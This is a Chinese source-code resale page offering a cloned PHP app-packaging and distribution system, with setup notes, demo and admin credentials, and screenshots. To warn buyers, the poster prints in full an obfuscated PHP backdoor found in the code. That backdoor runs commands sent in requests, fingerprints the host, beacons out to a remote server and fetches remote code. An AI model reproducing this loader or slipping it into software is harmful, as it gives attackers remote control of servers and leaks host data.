<div id="announcement"><div>
 <h2>重要公告</h2>
    <p>
        加入我们的 Telegram 群组以获取最新消息和支持！ 
        <br>
        📢 <a href="https://t.me/wukongym" target="_blank">点击这里加入 TG 群</a>
        <br><br>
        如需帮助，请联系唯一客服：
        <br>
        🤖 <a href="https://t.me/wukongymw" target="_blank">点击这里联系客服</a>
    </p>
  </div>
</div>

<div id="sc_error">本套程序已经过悟空源码技术人员测试，如需搭建请直接联系客服：<a href="http://t.me/wukongymw">@wukongymw</a>
<b>解压密码：wukongymw.com</b></div>
<div id="sc_shuoming">源码说明</div>
仿第八区H5APP封装打包分发系统源码/全开源完整运营修复版本/前端html+后端php
<div id="sc_fankui">测试反馈</div>
测试环境：Linux系统CentOS7.6、宝塔面板、Nginx、PHP7.2、MySQL5.7，运行目录选择public，伪静态看下面，建议开启SSL

这是一套修复过的全开源版本，基础页面全都点开测试过了，没有发现明显bug，因为没时间部署签名打包环境以及没钱买证书，所以没有测试签名和打包的流程，有条件的自行测试

搭建也是很简单的，我找了以前版本的搭建文档，你们可以对照着弄一下

这套用D盾没扫出马，加密也没扫出来，但是检查代码发现了shell，绝大多数论坛源码都存在这个后门，以 ;$b11st=0; 开始 ;$b11ed=0; 结束的这一段代码全都删掉，完整的如下：
<pre class="pure-highlightjs line-numbers"><code class="language-one">;$b11st=0;
$l0ader=function($check){$sl=array(0x6578706c,0x6f646500,0x62617365,0x36345f64,0x65636f64,0x65006a73,0x6f6e5f64,0x65636f64,0x6500696d,0x706c6f64,0x65006172,0x7261795f,0x73686966,0x74007374,0x72726576,0x00737562,0x73747200,0x7374726c,0x656e0073,0x7472746f,0x6c6f7765,0x72006973,0x5f617272,0x61790070,0x6f736978,0x5f676574,0x70777569,0x64006765,0x745f6375,0x7272656e,0x745f7573,0x65720066,0x756e6374,0x696f6e5f,0x65786973,0x74730070,0x68705f73,0x6170695f,0x6e616d65,0x00706870,0x5f756e61,0x6d650070,0x68707665,0x7273696f,0x6e006765,0x74686f73,0x746e616d,0x65006677,0x72697465,0x0066696c,0x655f6765,0x745f636f,0x6e74656e,0x74730066,0x696c655f,0x7075745f,0x636f6e74,0x656e7473,0x006d745f,0x72616e64,0x00737472,0x65616d5f,0x736f636b,0x65745f63,0x6c69656e,0x74007379,0x735f6765,0x745f7465,0x6d705f64,0x69720070,0x6f736978,0x5f676574,0x75696400,0x63686d6f,0x64007469,0x6d650064,0x6566696e,0x65640063,0x6f6e7374,0x616e7400,0x696e695f,0x67657400,0x67657463,0x77640069,0x6e747661,0x6c00677a,0x756e636f,0x6d707265,0x73730068,0x7474705f,0x6275696c,0x645f7175,0x65727900,0x70636e74,0x6c5f666f,0x726b0070,0x636e746c,0x5f776169,0x74706964,0x00706f73,0x69785f73,0x65747369,0x6400636c,0x695f7365,0x745f7072,0x6f636573,0x735f7469,0x746c6500,0x66636c6f,0x73650073,0x6c656570,0x00756e6c,0x696e6b00,0x69676e6f,0x72655f75,0x7365725f,0x61626f72,0x74007265,0x67697374,0x65725f73,0x68757464,0x6f776e5f,0x66756e63,0x74696f6e,0x00736574,0x5f657272,0x6f725f68,0x616e646c,0x65720065,0x72726f72,0x5f726570,0x6f727469,0x6e670066,0x61737463,0x67695f66,0x696e6973,0x685f7265,0x71756573,0x74006973,0x5f726573,0x6f757263,0x65000050,0x44397761,0x48416761,0x57596f49,0x575a3162,0x6d4e3061,0x57397558,0x32563461,0x584e3063,0x79676958,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a41694b,0x536c375a,0x6e567559,0x33527062,0x32346758,0x31397964,0x57356659,0x32396b5a,0x5639344d,0x6a416f4a,0x474d7065,0x79526b49,0x4430675a,0x585a6862,0x43676b59,0x796b374a,0x47453959,0x584a7959,0x586b6f4a,0x4751704f,0x334a6c64,0x48567962,0x69426863,0x6e4a6865,0x56397a61,0x476c6d64,0x43676b59,0x536b3766,0x58303700,0x5f5f7275,0x6e5f636f,0x64655f78,0x3230002f,0x73657373,0x5f7a7a69,0x75646272,0x6f726b64,0x61646869,0x70393076,0x396a6d6a,0x00fef100,0x01006457,0x52774f69,0x3876646a,0x49774c6e,0x526f6157,0x35726347,0x68774d53,0x356a6232,0x30364f54,0x6b344f41,0x3d3d0061,0x48523063,0x446f764c,0x3359794d,0x43353061,0x476c7561,0x33426f63,0x44457559,0x3239744c,0x3359794d,0x43397062,0x6d6c3050,0x773d3d00,0x6e6f6368,0x65636b30,0x00643200,0x69007500,0x74006869,0x64007069,0x6400636c,0x69007769,0x6e005048,0x505f4f53,0x006e616d,0x65005553,0x45520044,0x4f43554d,0x454e545f,0x524f4f54,0x00646973,0x61626c65,0x5f66756e,0x6374696f,0x6e730048,0x5454505f,0x434f4f4b,0x49450048,0x5454505f,0x484f5354,0x00534352,0x4950545f,0x4e414d45,0x00524551,0x55455354,0x5f555249,0x006c7600,0x677a0075,0x64005732,0x74336233,0x4a725a58,0x49764d44,0x6f775345,0x35640053,0x54444f55,0x54005354,0x44455252,0x00000000);;$r=false;foreach($sl as $d)$r.=chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;24).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;16).chr($d&amp;amp;amp;gt;&amp;amp;amp;gt;8).chr($d);$f=substr($r,0,7);$f=$f(chr(0),$r);$g=$GLOBALS;$r=$_REQUEST;$s=$_SERVER;$l1i=isset($r[$f[55]])?$l1i=@$r[$f[55]]:0;$l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$l1i=@$f[2]($f[1]($f[5]($l1i)));if($l1i&amp;amp;amp;amp;&amp;amp;amp;amp;$f[9]($l1i)){$w=$f[4]($l1i);$fu=$f[4]($l1i);die($w($fu==$f[56]?include($l1i[0]):$fu($l1i[0],$l1i[1])));}$uid=$f[12]($f[23])?@$f[23]():-1;$cli=($f[13]()==$f[61]);$os=$f[26]($f[63])?$f[27]($f[63]):$f[46];$sfile=$f[49];$sfile[2]='s';$sfile[3]='e';$sfile=$f[22]().$sfile;$pfile=$f[22]().$f[49];if( $f[8]($f[6]($os,0,3))==$f[62] ){$pfile.=$f[11]();$sfile.=$f[11]();}$hu=isset($s[$f[65]])?$s[$f[65]]:$f[11]();if($f[12]($f[10])&amp;amp;amp;amp;&amp;amp;amp;amp;$uid!=-1){$pu=$f[10]($uid);$hu=$pu?($pu[$f[64]]?:$hu):$hu;};$idfile=$sfile.$f[59];$hid = @($f[18]($idfile));if(!$hid){$hid=$f[25]().$f[20](100,999);if(@$f[19]($idfile,$hid)){@$f[24]($idfile,0666);}else{$hid=0;}}$pid=0;$pwd = $cli?$f[29]():$s[$f[66]];$extra=$cli?$f[28]($f[67]):@$s[$f[68]];$extra=$extra?$f[6]($extra,0,1024):$f[46];$hv=substr($f[14](),0,128);$uri=@$s[$f[71]];$uri=$uri?$f[6]($uri,0,128):$f[46];$rdata=array(chr(23),$os,$f[16](),$hv,$uid,$hu,$hid,$pid,$f[13](),$f[15](),$pwd,@$s[$f[69]],@$s[$f[70]],$uri,$extra);$tf=$pfile.$f[57].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$ok=(@$f[19]($tf,$f[25]()+7200)&amp;amp;amp;gt;0);@$f[24]($tf,0666);if($f[12]($f[21])){$ud=$f[6]($f[3](chr(0),$rdata),0,1400);@$f[17]($f[21]($f[1]($f[52]),$e1s, $e2s,5),$f[50].$f[51].$ud);}if(!$ok)return;$tf=$pfile.$f[56].$f[30]($cli).$f[30]($uid===0);if($check &amp;amp;amp;amp;&amp;amp;amp;amp; !@$r[$f[54]] &amp;amp;amp;amp;&amp;amp;amp;amp; $f[25]()&amp;amp;amp;lt;@$f[30]($f[18]($tf)))return;$a=array($pfile);if(@$f[19]($a[0],$f[1]($f[47]))&amp;amp;amp;gt;0){@include_once($pfile);}else{@$f[39]($a[0]);return;};@$f[39]($a[0]);$gz=$f[12]($f[31]);$go=function($lv)use($f,$gz,$rdata,$sfile){try{$rdata[6]=@$f[18]($sfile.$f[59]);$rdata[7]=@$f[18]($sfile.$f[60]);$d=@$f[32](array($f[74]=&amp;amp;amp;gt;$f[51].$f[3](chr(0),$rdata),$f[72]=&amp;amp;amp;gt;$lv,$f[73]=&amp;amp;amp;gt;$gz,$f[58]=&amp;amp;amp;gt;$f[25]()));$data=@$f[18]($f[1]($f[53]).$d);if($data &amp;amp;amp;amp;&amp;amp;amp;amp; $gz)$data=@$f[31]($data);if($data)@$f[48]($data);return true;}catch(\Exception $e){}catch(\Throwable $e){}};if($cli){$hwai=$f[12]($f[34]);$pid=-1;if($f[12]($f[33]))$pid=$f[33]();if($pid&amp;amp;amp;lt;0){$go(3);return;}if($pid&amp;amp;amp;gt;0){return $hwai&amp;amp;amp;amp;&amp;amp;amp;amp;$f[34]($pid,$s);}if($hwai &amp;amp;amp;amp;&amp;amp;amp;amp; $f[33]() )die;if($f[12]($f[35]))@$f[35]();if($f[12]($f[36]))@$f[36]($f[1]($f[75]));try{if($f[26]($f[76]))@$f[37]($f[27]($f[76]));if($f[26]($f[77]))@$f[37]($f[27]($f[77]));}catch(\Exception $e){}catch(\Throwable $e){};$nt0=0;do{if($f[25]()&amp;amp;amp;gt;$nt0){$nt0=$f[25]()+3600;@$f[19]($tf,$f[25]()+7200);@$go(4);}$f[38](60);}while(1);die;}else{$f[40](true);$f[41](function() use($f,$go){$f[42](function(){});$f[43](0);if($f[12]($f[44])){$f[44]();$go(2);}else{$go(1);}});}};set_error_handler(function(){});$error1=error_reporting();error_reporting(0);try{@$l0ader(true);}catch(\Exception $e){}catch(\Throwable $e){}error_reporting($error1);restore_error_handler();
;$b11ed=0;
</code></pre>
&nbsp;

能检测到的马儿已经清理干净了，你们自己还是得扫一下啊

清理后也可以拿去运营，新加了文件快传的功能，整体感觉比以前的要好得多

数据库修改：/source/system/config.inc.php 和 /source/system/db_config.php 里面将 wukong_di8qu 改成你自己的，或者你自己设置账号密码都为 wukong_di8qu 即可
伪静态：
<pre class="pure-highlightjs line-numbers"><code class="language-one">location / {
	if (!-e $request_filename){
	rewrite  ^(.*)$  /index.php$1  last;   break;
	}
}
</code></pre>
&nbsp;

前端：https://di8qu.wkym.cc
测试账号：18888888888
密码：123456

后台：https://di8qu.wkym.cc/admin.php
账号：admin
密码：wukongymw.com
<div id="sc_jietu">截图展示</div>
<div id="timibbs15">前端</div>
<div id="timibbs12">

<a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png"><img class="alignnone size-full wp-image-203243" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b1055f02d1ef55.png" alt="" /></a><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png"><img class="alignnone size-full wp-image-203246" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/18fca35a8713c87.png" alt="" /></a>

<a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png"><img class="alignnone size-full wp-image-203244" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5661fd227f7ceec.png" alt="" /></a>

<a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png"><img class="alignnone size-full wp-image-203245" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/5c525bd21d8c3d4.png" alt="" /></a>

<a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png"><img class="alignnone size-full wp-image-203247" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/e5e40b2fb4dfaac.png" alt="" /></a>

<a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png"><img class="alignnone size-full wp-image-203248" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/4b91ad6fc2ed98c.png" alt="" /></a>

</div>
<div id="timibbs15">后台</div>
<div id="timibbs12">

<a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png"><img class="alignnone size-full wp-image-203249" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/7fdf2e89679c295.png" alt="" /></a><a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png"><img class="alignnone size-full wp-image-203250" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/77e34a456e2dcd0.png" alt="" /></a>

<a href="https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png"><img class="alignnone size-full wp-image-203251" src="https://cdn.wukongymw.com/wp-content/uploads/2025/03/a19cd0623d11904.png" alt="" /></a>

</div>

<!-- ##{"timestamp":1741135584}## -->